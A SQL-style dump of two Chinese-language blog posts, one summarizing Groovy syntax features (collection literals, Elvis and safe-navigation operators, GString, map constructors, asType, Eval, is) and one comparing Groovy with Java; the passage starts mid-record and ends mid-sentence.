style=\"background-color:inherit\">,</span><span style=\"background-color:inherit; color:blue\">&#39;b&#39;</span><span style=\"background-color:inherit\">:</span><span style=\"background-color:inherit; color:blue\">&#39;d&#39;</span><span style=\"background-color:inherit\">]&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">某些时候，map的key可能是存在的一个变量，那这个时候，就要用括号把key抱起来，比如</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">String&nbsp;a&nbsp;=&nbsp;</span><span style=\"background-color:inherit; color:blue\">&#39;I&nbsp;am&nbsp;Key&#39;</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">Map&nbsp;map&nbsp;=&nbsp;[(a):<span style=\"background-color:inherit; color:blue\">&#39;I&nbsp;am&nbsp;Value&#39;</span><span style=\"background-color:inherit\">]&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><span style=\"font-family:arial; font-size:14px\">也可以定义空的List或者Map</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">List&nbsp;empty&nbsp;=&nbsp;[]&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">Map&nbsp;empty&nbsp;=&nbsp;[:]&nbsp;&nbsp;</span></li>\r\n</ol>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>需要知道的是，这种方式新建的List实例是ArrayList，Map实例是LinkedHashMap</p>\r\n\r\n<p><strong>2.二元运算符 ?:</strong></p>\r\n\r\n<p>java继承了C语言的问号表达式，二元运算符就是更加精简的问号表达式。形式：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">def&nbsp;result&nbsp;=&nbsp;a&nbsp;?:&nbsp;b&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">意为，如果条件为真，即a为true或者a有值，则result为a，否则result为b</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>3.安全占位符</strong></p>\r\n\r\n<p>这个很有用，可以避免很多NullPointerException，但是也不能滥用了</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">def&nbsp;result&nbsp;=&nbsp;obj?.property&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">代码里，obj是个对象，property是对象的一个熟悉，这行代码的意思，如果obj不为null，则会返回property属性的值，如果obj为null，这会直接返回null。语句可以一直串下去</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">def&nbsp;result&nbsp;=&nbsp;a?.b?.c?.d...&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>4.字段操作</strong></p>\r\n\r\n<p>按照Groovy Bean的标准，默认的时候类里面的所有字段，Groovy都会帮忙生成一个get方法。在类的外部，即便你直接用了属性名而不用get方法去取值，拿到的也是通过get方法拿到的值。如果想直接拿属性值怎么办呢？ 通过字段运算符：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><strong>class</strong><span style=\"background-color:inherit\">&nbsp;A&nbsp;{&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;String&nbsp;b&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">}&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">A&nbsp;a&nbsp;=&nbsp;<strong>new</strong><span style=\"background-color:inherit\">&nbsp;A()&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">a.b&nbsp;<span style=\"background-color:inherit; color:rgb(0, 130, 0)\">//通过get方法拿值</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">a.getB()&nbsp;<span style=\"background-color:inherit; color:rgb(0, 130, 0)\">//通过get方法拿值</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">a.<span style=\"background-color:inherit; color:rgb(100, 100, 100)\">@b</span><span style=\"background-color:inherit\">&nbsp;</span><span style=\"background-color:inherit; color:rgb(0, 130, 0)\">//直接拿值</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>5.GString</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Java里有String，Groovy里新加了GString。Groovy的语法是，如果用单引号括起来的就是String，如果是双引号括起来的就是GString。所以Groovy不能直接定义原来Java里的char了。</p>\r\n\r\n<p>String</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">String&nbsp;s&nbsp;=&nbsp;</span><span style=\"background-color:inherit; color:blue\">&#39;This&nbsp;is&nbsp;a&nbsp;String&#39;</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">GString</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">GString&nbsp;s&nbsp;=&nbsp;</span><span style=\"background-color:inherit; color:blue\">&quot;This&nbsp;is&nbsp;a&nbsp;GString&quot;</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">两种方式定义出来的实例类型是不一样的。当然GString不是这么简单的，GString的强大之处在于它可以作为模板使用</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">String&nbsp;name&nbsp;=&nbsp;</span><span style=\"background-color:inherit; color:blue\">&#39;count&#39;</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\"><strong>int</strong><span style=\"background-color:inherit\">&nbsp;value1&nbsp;=&nbsp;</span><span style=\"background-color:inherit; color:rgb(192, 0, 0)\">23</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\"><strong>int</strong><span style=\"background-color:inherit\">&nbsp;value2&nbsp;=&nbsp;</span><span style=\"background-color:inherit; color:rgb(192, 0, 0)\">22</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">GString&nbsp;s&nbsp;=&nbsp;<span style=\"background-color:inherit; color:blue\">&quot;The&nbsp;value&nbsp;of&nbsp;$name&nbsp;is&nbsp;${value1+value2}&quot;</span><span style=\"background-color:inherit\">&nbsp;&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">println&nbsp;s&nbsp;&nbsp;</span></li>\r\n</ol>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>最终的输出是： The value of count is 55</p>\r\n\r\n<p>倒数第二行，里面有关键字符 $, $即代表去引用上下文中的变量值，而${}中间不仅可以引用变量值，还可以加上一些运算，作为一个表达式</p>\r\n\r\n<p>最后一行这是把GString转换成String，再输出。</p>\r\n\r\n<p>String是常量，但是GString是变量，准确的说，在GString中的$仅仅是作为一个模板的占位符存在，GString会保存对那个对象的引用，如果引用的对象值发生改变，GString的值也就跟着改变。</p>\r\n\r\n<p>需要注意的是，Map里面String和GString就算最终生成的String值一样，但是还是当作两个key存在的。很容易理解，但是很容易犯的错误，比如手误把单引号写成了双引号等等都会引起这个错误。</p>\r\n\r\n<p><strong>6.构造函数</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><strong>class</strong><span style=\"background-color:inherit\">&nbsp;ClassA&nbsp;{&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;s1&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;<strong>int</strong><span style=\"background-color:inherit\">&nbsp;i1&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;ClassB&nbsp;cb&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">}&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\"><strong>class</strong><span style=\"background-color:inherit\">&nbsp;ClassB&nbsp;{&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;s2&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">}&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\"><strong>new</strong><span style=\"background-color:inherit\">&nbsp;ClassA(s1:</span><span style=\"background-color:inherit; color:blue\">&#39;pro&nbsp;in&nbsp;A&#39;</span><span style=\"background-color:inherit\">,&nbsp;i1:</span><span style=\"background-color:inherit; color:rgb(192, 0, 0)\">5</span><span style=\"background-color:inherit\">,&nbsp;cb:[s2:</span><span style=\"background-color:inherit; color:blue\">&#39;pro&nbsp;in&nbsp;B&#39;</span><span style=\"background-color:inherit\">])&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">以上代码是可以工作的，Groovy会创建一个ClassA的实例，并把&lsquo;pro in A&rsquo; 和 5 分别设到属性s1和i1里。即便有一个复杂类型的熟悉cb，也能正常工作，ClassB的对象会被创建出来，并设到属性cb上。ClassB里的s2熟悉当然就是&#39;pro in B&#39;了。</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>可以看到构造函数里的参数很像Map的定义，确实，其实传入Map也是可以的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><strong>new</strong><span style=\"background-color:inherit\">&nbsp;ClassA([s1:</span><span style=\"background-color:inherit; color:blue\">&#39;pro&nbsp;in&nbsp;A&#39;</span><span style=\"background-color:inherit\">,&nbsp;i1:</span><span style=\"background-color:inherit; color:rgb(192, 0, 0)\">5</span><span style=\"background-color:inherit\">,&nbsp;cb:[s2:</span><span style=\"background-color:inherit; color:blue\">&#39;pro&nbsp;in&nbsp;B&#39;</span><span style=\"background-color:inherit\">]])&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">这个功能，在一些数据模型转换的时候，比较方便。打个比方，前台来的JSON数据，直接全转成Map，再用构造函数new一下，就全部出来了。注意的是，如果Map存在某个类里没有的属性值，会出错误的。</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>7.asType</strong></p>\r\n\r\n<p>用Groovy的是，可能经常看到这样的代码</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">String&nbsp;a&nbsp;=&nbsp;</span><span style=\"background-color:inherit; color:blue\">&#39;78&#39;</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\"><strong>int</strong><span style=\"background-color:inherit\">&nbsp;b&nbsp;=&nbsp;a&nbsp;as&nbsp;</span><strong>int</strong><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">print&nbsp;b&nbsp;&nbsp;</span></li>\r\n</ol>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">第二行，有个关键字</span><strong>as</strong><span style=\"font-family:arial; font-size:14px\">，可以看出来作用就是把String类型的a转成int类型的b。它是怎么工作的呢，很简单，就是把这个操作代理给了String的asType方法，比如String有如下的方法（仅仅是例子，代码中不是这样）</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><strong>class</strong><span style=\"background-color:inherit\">&nbsp;String&nbsp;{&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;Object&nbsp;asType(Class&nbsp;clz)&nbsp;{&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>if</strong><span style=\"background-color:inherit\">(clz&nbsp;==&nbsp;Integer)&nbsp;{&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>return</strong><span style=\"background-color:inherit\">&nbsp;Integer.parseInt(</span><strong>this</strong><span style=\"background-color:inherit\">)&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<strong>else</strong><span style=\"background-color:inherit\">&nbsp;</span><strong>if</strong><span style=\"background-color:inherit\">(clz&nbsp;==&nbsp;GString)&nbsp;{&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>return</strong><span style=\"background-color:inherit\">&nbsp;</span><span style=\"background-color:inherit; color:blue\">&quot;$this&quot;</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<strong>else</strong><span style=\"background-color:inherit\">&nbsp;{&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>return</strong><span style=\"background-color:inherit\">&nbsp;</span><strong>super</strong><span style=\"background-color:inherit\">.asType(clz)&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;</span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">}&nbsp;&nbsp;</span></li>\r\n</ol>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">那么，String就可以用as运算符转换成int或者GString类型</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">String&nbsp;a&nbsp;=&nbsp;</span><span style=\"background-color:inherit; color:blue\">&#39;45&#39;</span><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\"><strong>int</strong><span style=\"background-color:inherit\">&nbsp;b&nbsp;=&nbsp;a&nbsp;as&nbsp;</span><strong>int</strong><span style=\"background-color:inherit\">&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">GString&nbsp;c&nbsp;=&nbsp;a&nbsp;as&nbsp;GString&nbsp;&nbsp;</span></li>\r\n</ol>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">上面的&nbsp;clz == GString 是合法的，在Groovy里等价于&nbsp;clz == GString.class</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>8. i<span style=\"font-family:simsun; font-size:16px\">nspect和eval</span></strong></p>\r\n\r\n<p><span style=\"font-family:simsun; font-size:16px\">eval就和javascript里的eval一样，就是直接执行一段Groovy脚本，可以用Eval.me(...script here...)直接调用。</span></p>\r\n\r\n<p><span style=\"font-family:simsun; font-size:16px\">inspect就是eval的反相操作了，就是把一个对象转成一个合法的可执行的脚本（我的理解，没仔细看过文档）。没试过其他对象，但是像Map，List之类的都可以转出来。这就够了，Map，List转出来的数据之于Groovy就相当于JSON之于JavaScript。在系统内部的时候就可以直接当作数据传输，虽然大家都不推荐这么用，但是我还是坚持，如果数据只包含Map，List，Number，String等简单类型，为什么不用呢？（如果Number里值是NaN或者Infinite的时候有问题，但是很容易解决，看Eval类里的其他两个方法就知道了）。呵呵，我也就这么用着，直到发现了一个Bug（http://stackoverflow.com/questions/7410252/groovy-inspect-handle-dollar-sign）,没法解决，我才换掉了实现。</span></p>\r\n\r\n<p><span style=\"font-family:simsun; font-size:16px\">但是我对这个东西还是有很大期待，如果都是内部集成，不存在安全问题，且没有很好JSON支持的时候，这种方式还是很好的方式。</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>9.is方法</p>\r\n\r\n<p>按照Groovy的定义，== 操作等于调用equals方法。这样，我们就失去了直接判断两个对象是不是同一对象的运算符。要判断是不是同一个对象，要调用is方法，比如thisObject.is(anotherObject)。这点非常重要，特别是在overwrite对象的equals方法的时候，eclipse自动生成的代码里面有些地方不能直接用==了，而要用is方法。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><span style=\"font-family:simsun; font-size:16px\">就这么多吧，以后如果发现更多新东西的时候再加。</span></p>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'Groovy常用语法总结',150,NULL,0),(6,0,'20150605195416',2,'<p>Groovy是Java的一个变种，并且和Java能够协同工作。所以Groovy语言也可以在JVM上运行，使用的方式基本和Java很相似，但是Groovy并不是可以取代Java，只是Groovy和Java可以很好的结合编码。</p>\r\n\r\n<p>下面开始搭建Groovy：</p>\r\n\r\n<p>还记得如果要运行Java程序的时候首先要安装JDK，并设置Java的环境变量（JAVA_HOME、path、CLASSPATH）等。Groovy也是需要类似Java一样的运行环境，它称为GDK</p>\r\n\r\n<p>下载GDK的地址：http://dist.codehaus.org/groovy/distributions/groovy-1.0.zip</p>\r\n\r\n<p>设置环境变量GROOVY_HOME</p>\r\n\r\n<p>(我的变量值为D:\\groovy-binary-1.6.2\\groovy-1.6.2</p>\r\n\r\n<p>将GROOVY_HOME目录下的bin追加到环境变量path中&nbsp;</p>\r\n\r\n<p>Java与Groovy的判断比较</p>\r\n\r\n<p>Java中的equals方法对应Groovy中的== , 而Java中的==（判断是否引用同一对象）对应Groovy中的is方法</p>\r\n\r\n<p>String name1=&ldquo;Java&rdquo;;&nbsp;</p>\r\n\r\n<p>String name2=new String(&ldquo;Java&rdquo;);</p>\r\n\r\n<p>&nbsp;&nbsp;// Groovy中写为 name1 == name2</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;if (name1.equals(name2)) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;equal&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;} else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;not equal&quot;);&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;// Groovy中写为 name1.is(name2)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;if (name1 == name2) {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;identical&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;} else {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;not identical&quot;);&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>\r\n\r\n<p>Java与Groovy的数组、循环比较</p>\r\n\r\n<p>Java中的数组定义int[] a = {1, 2, 3}; 在Groovy写成int[] a = [1, 2, 3]</p>\r\n\r\n<p>Java：</p>\r\n\r\n<p>for (int i =0; i &lt; len; i++) {</p>\r\n\r\n<p>&nbsp;&nbsp;// do something</p>\r\n\r\n<p>}&nbsp;</p>\r\n\r\n<p>Groovy:</p>\r\n\r\n<p>for (int i =0; i &lt; len; i++) {</p>\r\n\r\n<p>&nbsp;&nbsp;// do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// 或者</p>\r\n\r\n<p>for (i in 0..len-1) {</p>\r\n\r\n<p>&nbsp;&nbsp;// do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// 或者</p>\r\n\r\n<p>for (i in 0..&lt;len) {</p>\r\n\r\n<p>&nbsp;&nbsp;// do something</p>\r\n\r\n<p>}&nbsp;</p>\r\n\r\n<p>Java</p>\r\n\r\n<p>中的inner class即内部类，在Groovy中用Closure实现（Closure是Java7正在考虑的一个特性，比inner class在语义方面更完善）</p>\r\n\r\n<p>Groovy</p>\r\n\r\n<p>中的注释比Java多了首行注释#!，其他与Java相同比如单行注释：// &nbsp;&nbsp;&nbsp;多行注释： &nbsp;&nbsp;或者是 &nbsp;支持javadoc的</p>\r\n\r\n<p>Java:</p>\r\n\r\n<p>/*</p>\r\n\r\n<p>&nbsp;*&nbsp;</p>\r\n\r\n<p>&nbsp;*&nbsp;</p>\r\n\r\n<p>多行注释</p>\r\n\r\n<p>&nbsp;*</p>\r\n\r\n<p>&nbsp;*</p>\r\n\r\n<p>/</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/**</p>\r\n\r\n<p>&nbsp;*&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/**</p>\r\n\r\n<p>&nbsp;*&nbsp;</p>\r\n\r\n<p>javadoc 注释</p>\r\n\r\n<p>&nbsp;*</p>\r\n\r\n<p>&nbsp;*</p>\r\n\r\n<p>/</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>单行注释</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Groovy</p>\r\n\r\n<p>：</p>\r\n\r\n<p>#!</p>\r\n\r\n<p>首行注释，使Unix shell能够定位Groovy启动程序以运行Groovy代码，例如</p>\r\n\r\n<p>#!/</p>\r\n\r\n<p>usr/bin/groovy</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/*</p>\r\n\r\n<p>&nbsp;*&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/*</p>\r\n\r\n<p>&nbsp;*&nbsp;</p>\r\n\r\n<p>多行注释</p>\r\n\r\n<p>&nbsp;*</p>\r\n\r\n<p>&nbsp;*</p>\r\n\r\n<p>/</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/**</p>\r\n\r\n<p>&nbsp;*&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>/**</p>\r\n\r\n<p>&nbsp;*&nbsp;</p>\r\n\r\n<p>javadoc 注释</p>\r\n\r\n<p>&nbsp;*</p>\r\n\r\n<p>&nbsp;*</p>\r\n\r\n<p>/</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//&nbsp;</p>\r\n\r\n<p>单行注释&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Java5</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>中的for-each：for (Type t : iteratable) {...}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>在Groovy中，for (t in iteratable) {...}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Java:</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>for (Type t :&nbsp;</p>\r\n\r\n<p>iterable) {</p>\r\n\r\n<p>&nbsp;&nbsp;// do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;&nbsp;// do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>Groovy:</p>\r\n\r\n<p>for (t in iterable) {</p>\r\n\r\n<p>&nbsp;&nbsp;// do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>&nbsp;&nbsp;// do something</p>\r\n\r\n<p>}</p>\r\n\r\n<p>Groovy</p>\r\n\r\n<p>中switch语句与Java中相同，不过支持更多类型了，比如String</p>\r\n\r\n<p>&nbsp;Groovy</p>\r\n\r\n<p>的while语句跟Java相同，但废弃了do-while （考虑到语义方面</p>\r\n\r\n<p>的问题，而且</p>\r\n\r\n<p>do-while可以用其他形式的循环语句代替，使用频率低）</p>\r\n\r\n<p>Java</p>\r\n\r\n<p>中的String常量表示为&ldquo;Hello, 小明&rdquo;，在Groovy中可如下表示&nbsp;</p>\r\n\r\n<p>// 双引号</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&quot;Hello, 小明&quot;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>// 单引号也可以</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&#39;Hello, 小明&#39;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//多行字符串</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&quot;&quot;&quot;Hello,小明&quot;&quot;&quot;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//或者 Hello,小明&#39;&#39;&#39;</p>\r\n\r\n<p>// 替代字符串</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>（def 它是个弱类型，很像JavaScript中的var、Objective-c中 （id）类型。）</p>\r\n\r\n<p>def &nbsp;name = &quot;小明&quot;</p>\r\n\r\n<p>&quot;Hello, ${name}&quot;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//或者</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&quot;Hello, $name&quot;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>对象创建在</p>\r\n\r\n<p>Java写为Thought t = new Thought(); 在Groovy也可以这样写，不过还多了种写法：</p>\r\n\r\n<p>def t = new Thought();</p>\r\n\r\n<p>静态方法调用在Java和Groovy中相同，即ClassName.staticMethodName();实现接口和继承父类方面</p>\r\n\r\n<p>Groovy也与Java完全相同，即实现口class ClassName</p>\r\n\r\n<p>implements InterfaceName {...} &nbsp;继承父类：class ClassName extends SuperClass {...}</p>\r\n\r\n<p>定义接口方面</p>\r\n\r\n<p>Groovy与Java完全相同，</p>\r\n\r\n<p>即interface InterfaceNam{...} 